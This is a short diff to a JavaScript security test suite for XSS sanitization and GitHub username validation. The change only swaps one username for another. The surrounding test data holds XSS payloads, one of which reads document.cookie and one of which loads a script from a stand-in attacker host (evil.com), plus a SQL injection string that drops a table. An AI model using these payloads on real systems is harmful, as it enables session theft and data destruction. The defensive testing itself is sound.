@@ -17,7 +17,7 @@ describe('Security: STRIDE & OWASP Top 10 Cyber Attack Defense Suite', () => {
         '<script>alert(1)</script>',
         '<svg onload="alert(document.cookie)">',
         '"><img src=x onerror=alert(1)>',
-        'pratik&<>"\'',
+        'somyacodes07&<>"\'',
         '"><script src="//evil.com/xss.js"></script>'
       ];
 
@@ -31,7 +31,7 @@ describe('Security: STRIDE & OWASP Top 10 Cyber Attack Defense Suite', () => {
     });
 
     it('should strictly validate GitHub usernames with regex allowlist', () => {
-      const validUsers = ['pratikforge', 'user-name', 'a-b-c-1'];
+      const validUsers = ['somyacodes07', 'user-name', 'a-b-c-1'];
       const invalidUsers = [
         'user; DROP TABLE users;--',
         '<script>',
